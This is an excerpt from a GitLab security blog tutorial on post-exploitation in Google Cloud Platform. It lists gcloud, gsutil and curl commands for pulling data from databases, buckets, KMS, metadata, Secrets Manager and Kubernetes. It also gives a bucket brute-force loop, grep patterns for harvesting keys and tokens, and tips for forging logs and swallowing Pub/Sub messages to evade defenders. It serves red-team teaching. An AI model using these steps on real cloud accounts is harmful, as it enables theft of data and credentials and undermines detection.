---
author_name: Chris Moberly
title: Treasure hunting
description: The following sections detail tactics to view and exfiltrate data from various Google services..
---

Extracted from the GitLab blog post "[Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)" by [Chris Moberly](https://about.gitlab.com/company/team/#cmoberly)

---

As hackers, we want a root shell. Just because. But in the real world, what matters is acquiring digital assets - not escalating privileges. While a root shell may help us get there, it's not always required. The following sections detail tactics to view and exfiltrate data from various Google services.

If you have been unable to achieve any type of privilege escalation thus far, it is quite likely that working through the following sections will help you uncover secrets that can be used again in earlier steps, finally giving you that sweet root shell you so desire.

## Accessing databases

Most great breaches involve a database of one type or another. You should follow traditional methods inside your compromised instance to enumerate, access, and exfiltrate data from any that you encounter.

In addition to the traditional stuff, though, Google has [a handful of database technologies](https://cloud.google.com/products/databases/) that you may have access to via the default service account or another set of credentials you have compromised thus far.

If you've granted yourself web console access, that may be the easiest way to explore. Details on working with every database type in GCP would require another long blog post, but here are some `gcloud` documentation areas you might find useful:

- [Cloud SQL](https://cloud.google.com/sdk/gcloud/reference/sql/)
- [Cloud Spanner](https://cloud.google.com/sdk/gcloud/reference/spanner/)
- [Cloud Bigtable](https://cloud.google.com/sdk/gcloud/reference/bigtable/)
- [Cloud Firestore](https://cloud.google.com/sdk/gcloud/reference/firestore/)
- [Firebase](https://cloud.google.com/sdk/gcloud/reference/firebase/)

You may get lucky and discover ready-to-go backups of your target database when [enumerating storage buckets](#enumerating-storage-buckets). Otherwise, each database type provides various `gcloud` commands to export the data. This typically involves writing the database to a cloud storage bucket first, which you can then download. It may be best to use an existing bucket you already have access to, but you can also create your own if you want.

As an example, you can follow [Google's documentation](https://cloud.google.com/sql/docs/mysql/import-export/exporting) to exfiltrate a Cloud SQL database.

The following commands may be useful to help you identify database targets across the project.

```
# Cloud SQL
$ gcloud sql instances list
$ gcloud sql databases list --instance [INSTANCE]

# Cloud Spanner
$ gcloud spanner instances list
$ gcloud spanner databases list --instance [INSTANCE]

# Cloud Bigtable
$ gcloud bigtable instances list
```

## Enumerating storage buckets

We all love stumbling across open storage buckets, but finding them usually requires brute forcing massive wordlists or just getting lucky and tripping over them in source code. As shown in the "access scopes" section above, default configurations permit read access to storage. This means that your shell can now enumerate ALL storage buckets in the project, including listing and accessing the contents inside.

This can be a MAJOR vector for privilege escalation, as those buckets can contain secrets.

The following commands will help you explore this vector:

```
# List all storage buckets in project
$ gsutil ls

# Get detailed info on all buckets in project
$ gsutil ls -L

# List contents of a specific bucket (recursive, so careful!)
$ gsutil ls -r gs://bucket-name/

# Cat the context of a file without copying it locally
$ gsutil cat gs://bucket-name/folder/object

# Copy an object from the bucket to your local storage for review
$ gsutil cp gs://bucket-name/folder/object ~/
```

If your initial `gsutil ls` command generates a permission denied error, you may still have access to buckets - you just need to know their names first. Hopefully you've explored enough to get a feel for naming conventions in the project, which will assist in brute-forcing.

You can use a simple bash loop like the following to work through a wordlist. You should create a targeted wordlist based on the environment, as this command will essentially look for buckets from any customer.

```
$ for i in $(cat wordlist.txt); do gsutil ls -r gs://"$i"; done
```

## Decrypting secrets with crypto keys

[Cloud Key Management Service](https://cloud.google.com/kms/docs/) is a repository for storing cryptographic keys, such as those used to encrypt and decrypt sensitive files. Individual keys are stored in key rings, and granular permissions can be applied at either level. An [API is available] for key management and easy encryption/decryption of objects stored in Google storage.

If you're lucky, the service account assigned to your breached instance has access to some keys. Perhaps you've even noticed some encrypted files while rummaging through buckets.

It's possible that you have access to decryption keys but don't have the permissions required to figure out what those keys are. If you encounter encrypted files, it is worthwhile trying to find documentation, scripts, or bash history somewhere to figure out the required arguments for the command below.

Assuming you do have permission to enumerate, the process looks like this. Below we're assuming that all keys were made available globally, but it's possible there are keys pinned to specific regions only.

```
# List the global keyrings available
$ gcloud kms keyrings list --location global

# List the keys inside a keyring
$ gcloud kms keys list --keyring [KEYRING NAME] --location global

# Decrypt a file using one of your keys
$ gcloud kms decrypt --ciphertext-file=[INFILE] \
    --plaintext-file=[OUTFILE] \
    --key [KEY] \
    --keyring [KEYRING] \
    --location global
```

## Querying custom metadata

Administrators can add [custom metadata](https://cloud.google.com/compute/docs/storing-retrieving-metadata#custom) at the instance and project level. This is simply a way to pass arbitrary key/value pairs into an instance, and is commonly used for environment variables and startup/shutdown scripts.

If you followed the steps above, you've already queried the metadata endpoint for all available information. This would have included any custom metadata. You can also use the following commands to view it on its own:

```
# view project metadata
$ curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# view instance metadata
$ curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```

Maybe you'll get lucky and find something juicy.

## Reviewing serial console logs

By default, compute instances write output from the OS and BIOS to serial ports. Google provides [a couple of ways](https://cloud.google.com/compute/docs/instances/viewing-serial-port-output) to view these log files. The first is via the compute API and can be executed even via the restrictive "Compute: Read Only" access scope.

Serial console logs may expose sensitive information from the system logs, which a low-privilege shell on a compute instance may not have access to view. However, you might be able to bypass this restriction if the instance is bound to a service account with the appropriate rights. If these rights are granted project-wide, you'll be able to view the logs on all compute instances, possibly providing information required to move laterally to other instances.

You can use the following [gcloud command](https://cloud.google.com/sdk/gcloud/reference/compute/instances/get-serial-port-output) to query the serial port logs:

```
gcloud compute instances get-serial-port-output instance-name \
  --port port \
  --start start \
  --zone zone
```

In addition, serial port logs may be stored to Cloud Logging, if [enabled by an administrator](https://cloud.google.com/compute/docs/instances/viewing-serial-port-output#enable-stackdriver). If you've gained access to read permissions for logging, this may be an alternative method to view this information. Read the "[Reviewing Stackdriver logging](#reviewing-stackdriver-logging)" section for more info.


## Reviewing custom images

Custom compute images may contain sensitive details or other vulnerable configurations that you can exploit. You can query the list of non-standard images in a project with the following command:

```
$ gcloud compute images list --no-standard-images
```

You can then [export](https://cloud.google.com/sdk/gcloud/reference/compute/images/export) the virtual disks from any image in multiple formats. The following command would export the image `test-image` in qcow2 format, allowing you to download the file and build a VM locally for further investigation:

```
$ gcloud compute images export --image test-image \
    --export-format qcow2 --destination-uri [BUCKET]
```

## Reviewing Custom Instance Templates

An [instance template](https://cloud.google.com/compute/docs/instance-templates/) defines instance properties to help deploy consistent configurations. These may contain the same types of sensitive data as a running instance's custom metadata. You can use the following commands to investigate:

```
# List the available templates
$ gcloud compute instance-templates list

# Get the details of a specific template
$ gcloud compute instance-templates describe [TEMPLATE NAME]
```

## Reviewing Stackdriver logging

[Stackdriver](https://cloud.google.com/stackdriver/) is Google's general-purpose infrastructure logging suite. There is a LOT of data that could be captured here. This can include syslog-like capabilities that report individual commands run inside Compute Instances, HTTP requests sent to load balancers or App Engine applications, network packet metadata for VPC communications, and more.

The service account for a Compute Instance only needs WRITE access to enable logging on instance actions, but an administrator may mistakenly grant the service account both READ and WRITE access. If this is the case, you can explore logs for sensitive data.

[gcloud logging](https://cloud.google.com/sdk/gcloud/reference/logging/) provides tools to get this done. First, you'll want to see what types of logs are available in your current project. The following shows the command and output from a test project:

```
$ gcloud logging logs list
NAME
projects/REDACTED/logs/OSConfigAgent
projects/REDACTED/logs/cloudaudit.googleapis.com%2Factivity
projects/REDACTED/logs/cloudaudit.googleapis.com%2Fsystem_event
projects/REDACTED/logs/bash.history
projects/REDACTED/logs/compute.googleapis.com
projects/REDACTED/logs/compute.googleapis.com%2Factivity_log
```

The output you see will be all of the log folders in the project that contain entries. So, if you see it - something is there. Folders are generated automatically by the standard Google APIs but can also be created by any application with IAM permissions to write to logs.

You may notice an interesting custom name in the list above (unfortunately, `bash.history` is not a default). While you should inspect all log entries, definitely take the time to manually review and understand if something is worth looking at more closely.

You can view the logs for an individual item as follows.

```
$ gcloud logging read [FOLDER]
```

Omitting the folder name will just start dumping all the logs. You might want to add a `--LIMIT` flag if you do this.

If a service account has permissions to write to log file (even the most restricted generally do), you can write arbitrary data to existing log folders and/or create new log folders and write data there as follows.

```
$ gcloud logging write [FOLDER] [MESSAGE]
```

Advanced write functionality (payload type, severity, etc) can be found in the [gcloud logging write documentation](https://cloud.google.com/sdk/gcloud/reference/logging/write).

Extra-crafty attackers can get creative with this. Writing log entries may be an interesting way to distract the Blue Team folks, hide your actions, or even phish via detection/response events.

## Reviewing cloud functions

Google [Cloud Functions](https://cloud.google.com/functions/) allow you to host code that is executed when an event is triggered, without the requirement to manage a host operating system. These functions can also store environment variables to be used by the code. And what do people use environment variables for? Secrets!

You can see if any cloud functions are available to you by running:

```
$ gcloud functions list
```

You can then query an individual function for its configuration, which would include any defined environment variables:

```
$ gcloud functions describe [FUNCTION NAME]
```

The output log of previous runs may be useful as well, which you get review with:

```
# You can omit the function name to view all the logs
# By default, limits to 10 lines
$ gcloud functions logs read [FUNCTION NAME] --limit [NUMBER]
```

## Reviewing app engine configurations

Google [App Engine](https://cloud.google.com/appengine/) is another ["serverless"](/topics/serverless/) offering for hosting applications, with a focus on scalability. As with Cloud Functions, there is a chance that the application will rely on secrets that are accessed at run-time via environment variables. These variables are stored in an `app.yaml` file which can be accessed as follows:

```
# First, get a list of all available versions of all services
$ gcloud app versions list

# Then, get the specific details on a given app
$ gcloud app describe [APP]
```

## Reviewing cloud run configurations

Google [Cloud Run](https://cloud.google.com/run) is... yep, another "serverless" offering! You'll want to also look here for environment variables, but this one introduces a new potential exploitation vector. Basically, Cloud Run creates a small web server, running on port 8080, that sits around waiting for an HTTP GET request. When the request is received, a job is executed and the job log is output via an HTTP response.

When a Cloud Run service is created, the administrator has the option to use IAM permissions to control who can start that job. They can also configure it to be completely unauthenticated, meaning that anyone with the URL can trigger the job and view the output.

Jobs are run in containers via Kubernetes, in clusters that are fully managed by Google or partially managed via [Anthos](https://cloud.google.com/anthos).

Tread carefully here. We don't know what these jobs do, and triggering one without understanding that may cause heartache for your production team.

The following commands will help you explore this vector.

```
# First get a list of services across the available platforms
$ gcloud run services list --platform=managed
$ gcloud run services list --platform=gke

# To learn more, export as JSON and investigate what the services do
$ gcloud run services list --platform=managed --format=json
$ gcloud run services list --platform=gke --format=json

# Attempt to trigger a job unauthenticated
$ curl [URL]

# Attempt to trigger a job with your current gcloud authorization
$ curl -H \
    "Authorization: Bearer $(gcloud auth print-identity-token)" \
    [URL]
```

## Reviewing AI platform configurations

Google [AI Platform](https://cloud.google.com/ai-platform/) is (yep, another) "serverless" offering for machine learning projects.

There are a few areas here you can look for interesting information - models and jobs. Try the following commands.

```
$ gcloud ai-platform models list --format=json
$ gcloud ai-platform jobs list --format=json
```

## Reviewing cloud pub/sub

Google [Cloud Pub/Sub](https://cloud.google.com/pubsub/) is a service that allows independent applications to send messages back and forth.

Pub/Sub consists of the following [core concepts](https://cloud.google.com/pubsub/docs/overview#data_model):

- Topic: A logical grouping for messages
- Subscriptions: This is where applications access a stream of messages related to a topic. Some Google services can receive these via a push notification, while custom services can subscribe using a pull.
- Messages: Some data and optionally metadata.

There is a lot of potential for attackers here in terms of affecting these messages and, in turn, the behaviour of the applications that rely on them. That's a topic for another day - this section focuses only on mostly-passive exploration of these streams using [gcloud pubsub](https://cloud.google.com/sdk/gcloud/reference/pubsub/).

The following commands should help you explore.

```
# Get a list of topics in the project
$ gcloud pubsub topics list

# Get a list of subscriptions across all topics
$ gcloud pubsub subscriptions list --format=json
```

The [pull](https://cloud.google.com/sdk/gcloud/reference/pubsub/subscriptions/pull) command will allow us to mimic a valid application, asking for messages that have not yet been acknowledged as delivered. You can mimic this behaviour with the following command, which will NOT send an ACK back and should therefore not impact other applications depending on the subscription:

```
$ gcloud pubsub subscriptions pull [SUBSCRIPTION NAME]
```

A savvy attacker might realize that they could intentionally ACK messages to ensure they are never received by the valid applications. This could be helpful to evade some detection implementations.

However, you may have better results [asking for a larger set of data](https://cloud.google.com/pubsub/docs/replay-overview), including older messages. This has some prerequisites and could impact applications, so make sure you really know what you're doing.

## Reviewing cloud Git repositories

Google's [Cloud Source Repositories](https://cloud.google.com/source-repositories/) are Git designed to be private storage for source code. You might find useful secrets here, or use the source to discover vulnerabilities in other applications.

You can explore the available repositories with the following commands:

```
# enumerate what's available
$ gcloud source repos list

# clone a repo locally
$ gcloud source repos clone [REPO NAME]
```

## Reviewing cloud filestore instances

Google [Cloud Filestore](https://cloud.google.com/filestore/) is NAS for Compute Instances and Kubernetes Engine instances. You can think of this like any other shared document repository - a potential source of sensitive info.

If you find a filestore available in the project, you can mount it from within your compromised Compute Instance. Use the following command to see if any exist.

```
$ gcloud filestore instances list --format=json
```

## Taking a crack at Kubernetes

[Google Kubernetes Engine](https://cloud.google.com/kubernetes-engine/) is managed Kubernetes as a service.

Kubernetes is worthy of its own tutorial, particularly if you are looking to break out of a container into the wider GCP project. We're going to keep it short and sweet for now.

First, you can check to see if any Kubernetes clusters exist in your project.

```
$ gcloud container clusters list
```

If you do have a cluster, you can have `gcloud` automatically configure your `~/.kube/config` file. This file is used to authenticate you when you use [kubectl](https://kubernetes.io/docs/reference/kubectl/overview/), the native CLI for interacting with K8s clusters. Try this command.

```
$ gcloud container clusters get-credentials [CLUSTER NAME] --region [REGION]
```

Then, take a look at the `~/.kube/config` file to see the generated credentials. This file will be used to automatically refresh access tokens based on the same identity that your active `gcloud` session is using. This of course requires the correct permissions in place.

Once this is set up, you can try the following command to get the cluster configuration.

```
kubectl cluster-info
```

You can read more about `gcloud` for containers [here](https://cloud.google.com/sdk/gcloud/reference/container/).

## Reviewing secrets management

Google [Secrets Management](https://cloud.google.com/solutions/secrets-management/) is a vault-like solution for storing passwords, API keys, certificates, and other sensitive data. As of this writing, it is currently in beta.

If in use, this could be a gold mine. Give it a shot as follows:

```
# First, list the entries
$ gcloud beta secrets list

# Then, pull the clear-text of any secret
$ gcloud beta secrets versions access 1 --secret="[SECRET NAME]"
```

Note that changing a secret entry will create a new version, so it's worth changing the `1` in the command above to a `2` and so on.

As this offering is still in beta, these commands are likely to change with time.

## Searching the local system for secrets

Temporary directories, history files, environment variables, shell scripts, and various world-readable files are usually a treasure trove for secrets. You probably already know all that, so here are some regexes that will come in handy when grepping for things specific to GCP.

Each grep command is using the `-r` flag to search recursively, so first set the TARGET_DIR variable and then fire away.

```
TARGET_DIR="/path/to/whatever"

# Service account keys
grep -Pzr "(?s){[^{}]*?service_account[^{}]*?private_key.*?}" \
    "$TARGET_DIR"

# Legacy GCP creds
grep -Pzr "(?s){[^{}]*?client_id[^{}]*?client_secret.*?}" \
    "$TARGET_DIR"

# Google API keys
grep -Pr "AIza[a-zA-Z0-9\\-_]{35}" \
    "$TARGET_DIR"

# Google OAuth tokens
grep -Pr "ya29\.[a-zA-Z0-9_-]{100,200}" \
    "$TARGET_DIR"

# Generic SSH keys
grep -Pzr "(?s)-----BEGIN[ A-Z]*?PRIVATE KEY[
    
    a-zA-Z0-9/\+=\n-]*?END[ A-Z]*?PRIVATE KEY-----" \
    "$TARGET_DIR"

# Signed storage URLs
grep -Pir "storage.googleapis.com.*?Goog-Signature=[a-f0-9]+" \
    "$TARGET_DIR"

# Signed policy documents in HTML
grep -Pzr '(?s)<form action.*?googleapis.com.*?name="signature" value=".*?">' \
    "$TARGET_DIR"
```